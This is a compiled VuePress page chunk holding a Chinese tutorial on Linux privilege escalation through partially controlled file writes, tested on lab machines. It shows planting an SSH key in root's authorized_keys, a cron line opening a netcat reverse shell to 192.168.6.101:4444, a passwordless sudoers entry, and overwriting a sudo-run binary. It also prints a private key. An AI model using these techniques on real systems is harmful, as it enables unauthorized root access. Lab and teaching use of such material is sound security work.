(window.webpackJsonp=window.webpackJsonp||[]).push([[166],{528:function(s,a,e){"use strict";e.r(a);var n=e(11),t=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("p",[s._v("该利用方式为写入内容不完全可控条件下，构造出一个 "),a("code",[s._v("换行")]),s._v("，并完全控制一行内容，从而实现权限提升。")]),s._v(" "),a("p",[s._v("核心思路：利用高敏感配置文件对文件内容格式的容错性以及写入后立即生效特性，构造恶意内容写入文件，从而实现提权。")]),s._v(" "),a("p",[s._v("下面给出四种文件写提权方案")]),s._v(" "),a("h2",{attrs:{id:"_0、输出-写入内容覆写-sudo-文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0、输出-写入内容覆写-sudo-文件"}},[s._v("#")]),s._v(" 0、输出/写入内容覆写 sudo 文件")]),s._v(" "),a("p",[s._v("优点：简单暴力，无需寻找其他利用文件，覆写文件本身。"),a("br"),s._v("\n缺点：破坏性强，不可重复利用。")]),s._v(" "),a("p",[s._v("如果是 sudo 文件，能构造出换行并控制写入其中一行内容，那么直接覆盖整个文件。如果不是二进制文件或没有使用 "),a("code",[s._v("#!")]),s._v(" 指定解释器，默认作为 shell 脚本解析，bash 脚本默认遇到错误行仍然会继续往下走。")]),s._v(" "),a("p",[s._v("扩展：")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://baike.baidu.com/item/%E9%AD%94%E6%95%B0/2464954",target:"_blank",rel:"noopener noreferrer"}},[s._v("魔数"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://zh.wikipedia.org/wiki/Shebang",target:"_blank",rel:"noopener noreferrer"}},[s._v("Shebang - 维基百科"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://blog.csdn.net/weixin_43999327/article/details/104553431",target:"_blank",rel:"noopener noreferrer"}},[s._v("Linux - 认识shell的解释行（Shebang）"),a("OutboundLink")],1)])]),s._v(" "),a("p",[s._v("这里以我的 Search 靶机来演示，提权方案是 sudo dirsearch，通过 dirsearch 的参数控制写入日志的行为，构造一个换行，然后完全控制一行内容，覆写 dirsearch 本身")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/25.png",alt:""}})]),s._v(" "),a("p",[s._v("成功控制文件写入内容，覆写 dirsearch，现在sudo 执行dirsearch 就会被当成 bash 脚本来执行")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/26.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_1-ssh-授权公钥文件-authorized-keys"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-ssh-授权公钥文件-authorized-keys"}},[s._v("#")]),s._v(" 1. SSH 授权公钥文件 (authorized_keys)")]),s._v(" "),a("p",[s._v("选择理由：authorized_keys 会将文件中的每一行解析为一条独立的公钥（空行和以 # 开头的注释行除外），只要整行语法合法就会被 sshd 接受并参与认证匹配。这种“逐行独立解析”的机制，使我们只需成功写入一行格式正确的公钥，就能在不破坏原有配置的前提下实现权限提升。")]),s._v(" "),a("p",[s._v("优点：只需写入一行合法公钥即可提权"),a("br"),s._v("\n缺点：需要 .ssh 目录存在且权限正确"),a("br"),s._v("\n适用范围：大部分 Linux 发行版均适用，包括 Debian、Ubuntu、Alpine 等。")]),s._v(" "),a("p",[s._v("文件的每一行包含一个密钥（空行和以“#”开头的行将被视为注释而忽略）。公钥由以下以空格分隔的字段组成：options、keytype、base64 编码的密钥和注释。options 字段是可选的。")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("[options] keytype base64编码的公钥数据 [comment]\nssh-rsa AAAAB3NzaC1yc2E... test@test\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("man 手册"),a("a",{attrs:{href:"https://man.openbsd.org/sshd",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://man.openbsd.org/sshd"),a("OutboundLink")],1),s._v("中关于 authorized_keys 的描述：")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/1.png",alt:""}})]),s._v(" "),a("p",[s._v("准备一对 SSH 密钥对：")]),s._v(" "),a("p",[s._v("公钥：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+m ssh-ed25519-20251128170612\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("私钥：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\nc2gtZWQyNTUxOQAAACALwes3fSGwRVGRVWlWhw22MW5c81iFEb2zgo9osd4PpgAA\nAKBvt7BNb7ewTQAAAAtzc2gtZWQyNTUxOQAAACALwes3fSGwRVGRVWlWhw22MW5c\n81iFEb2zgo9osd4PpgAAAEBypkeI+1U7vOaeNLqi/CkDuVQPa2rXWF8peXA/0pUp\nqwvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+mAAAAGnNzaC1lZDI1NTE5\nLTIwMjUxMTI4MTcwNjEyAQID\n-----END OPENSSH PRIVATE KEY-----\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("测试：把公钥写入root用户的 "),a("code",[s._v("/root/.ssh/authorized_keys")]),s._v(" 文件中")]),s._v(" "),a("p",[s._v(".ssh 目录权限控制")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" /root/.ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("700")]),s._v(" /root/.ssh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("公钥写入内容")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("1a\n2b\n3c\n4d\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAvB6zd9IbBFUZFVaVaHDbYxblzzWIURvbOCj2ix3g+m ssh-ed25519-20251128170612\n5e\n6f\n7g\n8h\n9i\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("h3",{attrs:{id:"debian-10"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#debian-10"}},[s._v("#")]),s._v(" Debian 10")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/2.png",alt:""}})]),s._v(" "),a("p",[s._v("Kali SSH 可以成功登录 root")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/3.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"ubuntu-22-04"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ubuntu-22-04"}},[s._v("#")]),s._v(" Ubuntu 22.04")]),s._v(" "),a("p",[s._v("写入公钥")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/21.png",alt:""}})]),s._v(" "),a("p",[s._v("Kali SSH 可以成功登录 root")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/22.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"alpine"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#alpine"}},[s._v("#")]),s._v(" Alpine")]),s._v(" "),a("p",[s._v("写入公钥")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/23.png",alt:""}})]),s._v(" "),a("p",[s._v("kali ssh可以成功登录root")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/24.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_2-系统定时任务文件-cron"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-系统定时任务文件-cron"}},[s._v("#")]),s._v(" 2. 系统定时任务文件（Cron）")]),s._v(" "),a("p",[s._v("选择理由：在 Alpine Linux（busybox crond）系统下，crond 会跳过语法错误的行并继续执行同一文件中其他合法的定时任务条目，不会因为单行错误而影响整体任务执行。在 Debian 系发行版（如 Debian、Ubuntu、Kali 等）中，如果 "),a("code",[s._v("/etc/crontab")]),s._v(" 或 "),a("code",[s._v("/etc/cron.d/*")]),s._v(" 中存在语法错误行，通常会导致整个该 crontab 文件被忽略。")]),s._v(" "),a("p",[s._v("优点：只需写入一行合法定时任务即可提权"),a("br"),s._v("\n缺点：仅在 Alpine 系统下测试成功，Debian 系会因格式错误忽略整个定时任务文件"),a("br"),s._v("\n适用范围：仅在 Alpine（busybox crond）环境下测试验证通过。在 Debian、Ubuntu、Kali 等 Debian 系发行版中，由于 crond 在检测到语法错误时会忽略整个 crontab 文件，本方法在这些系统上实测无法稳定利用。")]),s._v(" "),a("p",[s._v("常见定时任务文件位置与格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("busybox crond\tAlpine/容器精简系统\t/etc/crontabs/<user>\ncrond (Cronie)\tCentOS / RHEL 系列\t/etc/crontab + /etc/cron.d/*\ncron / Vixie cron\tDebian / Ubuntu 系列\t/etc/crontab + /etc/cron.d/*\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("文件内容格式：")]),s._v(" "),a("p",[s._v("Alpine 系统下 "),a("code",[s._v("/etc/crontabs/<user>")]),s._v(" 文件格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("* * * * * command\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("非 Alpine 系统下 "),a("code",[s._v("/etc/crontab")]),s._v(" 和 "),a("code",[s._v("/etc/cron.d/*")]),s._v(" 文件格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("* * * * * user command\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("对于非 Alpine 等精简系统，更推荐在 "),a("code",[s._v("/etc/cron.d/")]),s._v(" 目录下放置定时任务文件，文件名可以任意命名。")]),s._v(" "),a("h3",{attrs:{id:"debian-10-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#debian-10-2"}},[s._v("#")]),s._v(" Debian 10")]),s._v(" "),a("p",[s._v("测试：在 Debian 测试环境下，把恶意定时任务写入 "),a("code",[s._v("/etc/cron.d/rootRevShell")]),s._v(" 文件中")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v('1\n2\n3\n4\n* * * * * root /bin/bash -c "busybox nc 192.168.6.101 4444 -e bash"\n5\n6\n7\n8\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("Debian 下，通过日志定位，定时任务因为一行语法错误，整个定时任务文件被忽略")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("root@MazeSec:~# sudo grep cron /var/log/syslog | tail -20\nNov 28 04:17:01 moban CRON[651]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)\nNov 28 04:28:01 moban cron[326]: Error: bad hour; while reading /etc/cron.d/rootRevShell\nNov 28 04:28:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)\nNov 28 04:32:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)\nNov 28 04:32:01 moban cron[326]: Error: bad hour; while reading /etc/cron.d/rootRevShell\nNov 28 04:32:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)\nNov 28 04:33:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)\nNov 28 04:33:01 moban cron[326]: Error: bad minute; while reading /etc/cron.d/rootRevShell\nNov 28 04:33:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)\nNov 28 04:36:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)\nNov 28 04:38:01 moban cron[326]: (*system*rootRevShell) RELOAD (/etc/cron.d/rootRevShell)\nNov 28 04:38:01 moban cron[326]: Error: bad minute; while reading /etc/cron.d/rootRevShell\nNov 28 04:38:01 moban cron[326]: (*system*rootRevShell) ERROR (Syntax error, this crontab file will be ignored)\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/4.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"kali"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#kali"}},[s._v("#")]),s._v(" Kali")]),s._v(" "),a("p",[s._v("本地 Kali 尝试写入定时任务测试，同样因语法错误，整个定时任务文件被忽略")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/5.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"ubuntu-22-04-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ubuntu-22-04-2"}},[s._v("#")]),s._v(" Ubuntu 22.04")]),s._v(" "),a("p",[s._v("测试 Ubuntu 系统，同样因为语法错误，整个定时任务文件被忽略")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/6.png",alt:""}})]),s._v(" "),a("p",[s._v("好吧，有错误内容的定时任务在 Debian 系下似乎玩不转")]),s._v(" "),a("h3",{attrs:{id:"alpine-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#alpine-2"}},[s._v("#")]),s._v(" Alpine")]),s._v(" "),a("p",[s._v("测试：在 Alpine 测试环境下，把恶意定时任务写入 "),a("code",[s._v("/etc/crontabs/root")]),s._v(" 文件中，即使存在错误内容，仍然可以成功执行正确的定时任务行")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/7.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/8.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"_3-sudo-配置文件-sudoers"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-sudo-配置文件-sudoers"}},[s._v("#")]),s._v(" 3. sudo 配置文件（sudoers）")]),s._v(" "),a("p",[s._v("利用理由：sudoers 解析器在读取配置时会跳过语法错误的行，并继续解析后续合法配置行。这种“跳过错误行”的机制，使我们只需成功写入一行格式正确的恶意配置，就能在不破坏原有配置的前提下实现权限提升。")]),s._v(" "),a("p",[s._v("优点：只需写入一行合法 sudoers 配置即可提权"),a("br"),s._v("\n缺点：未知"),a("br"),s._v("\n适用范围：大部分 Linux 发行版均适用，包括 Debian、Ubuntu、Alpine 等。")]),s._v(" "),a("p",[s._v("sudoers 文件格式：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("root    ALL=(ALL:ALL) ALL\nwelcome ALL=(ALL:ALL) NOPASSWD:/path/to/xxx\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("div",{staticClass:"custom-block danger"},[a("p",{staticClass:"custom-block-title"},[s._v("警告")]),s._v(" "),a("p",[s._v("实际操作建议：写入无密码的 sudo 权限配置，避免因目标用户需要输入密码而无法利用，当然，如果你知道用户密码，随意。")])]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("user ALL=(ALL:ALL) NOPASSWD: ALL\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"debian-10-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#debian-10-3"}},[s._v("#")]),s._v(" Debian 10")]),s._v(" "),a("p",[s._v("测试：在 Debian 测试环境下，把恶意 sudoers 配置写入 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中")]),s._v(" "),a("p",[s._v("当前无 sudo 权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/9.png",alt:""}})]),s._v(" "),a("p",[s._v("切到 root，在 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中写入内容：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("1\n2\n3\n4\nwelcome ALL=(ALL:ALL) NOPASSWD: ALL\n5\n6\n7\n8\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/10.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/11.png",alt:""}})]),s._v(" "),a("p",[s._v("切回 welcome 用户，测试 sudo 权限提升成功")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/12.png",alt:""}})]),s._v(" "),a("p",[s._v("sudoers.d 的授权文件报了语法错误，不过问题不大，正确的行已经生效了，嫌报错碍事提权把文件里的错误行删掉即可。")]),s._v(" "),a("h3",{attrs:{id:"ubuntu-22-04-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ubuntu-22-04-3"}},[s._v("#")]),s._v(" Ubuntu 22.04")]),s._v(" "),a("p",[s._v("测试：在 Ubuntu 测试环境下，把恶意 sudoers 配置写入 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中")]),s._v(" "),a("p",[s._v("当前无 sudo 权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/13.png",alt:""}})]),s._v(" "),a("p",[s._v("切到 root，在 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中写入内容：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("1\n2\n3\n4\nwelcome ALL=(ALL:ALL) NOPASSWD: ALL\n5\n6\n7\n8\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/14.png",alt:""}})]),s._v(" "),a("p",[s._v("切回 welcome 用户，测试 sudo 权限提升成功")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/15.png",alt:""}})]),s._v(" "),a("h3",{attrs:{id:"alpine-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#alpine-3"}},[s._v("#")]),s._v(" Alpine")]),s._v(" "),a("p",[s._v("测试：在 Alpine 测试环境下，把恶意 sudoers 配置写入 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中")]),s._v(" "),a("p",[s._v("当前无 sudo 权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/17.png",alt:""}})]),s._v(" "),a("p",[s._v("切到 root，在 "),a("code",[s._v("/etc/sudoers.d/welcome")]),s._v(" 文件中写入内容：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("1\n2\n3\n4\nwelcome ALL=(ALL:ALL) NOPASSWD: ALL\n5\n6\n7\n8\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/18.png",alt:""}})]),s._v(" "),a("p",[s._v("回到 welcome 用户，测试 sudo 权限提升成功")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/19.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/linux-config-privesc/20.png",alt:""}})])])}),[],!1,null,null,null);a.default=t.exports}}]);